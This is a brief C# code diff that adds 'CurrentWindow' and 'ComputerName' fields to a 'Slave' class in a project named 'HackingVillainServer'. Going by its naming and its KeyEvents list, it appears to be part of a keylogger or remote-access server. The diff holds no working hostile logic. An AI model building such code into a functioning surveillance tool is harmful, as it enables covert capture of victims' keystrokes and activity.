@@ -13,6 +13,8 @@ namespace HackingVillainServer
     {
         public ISocket Socket;
         public List<string> KeyEvents;
+        public string CurrentWindow;
+        public string ComputerName;
 
         public Slave(ISocket sock)
         {
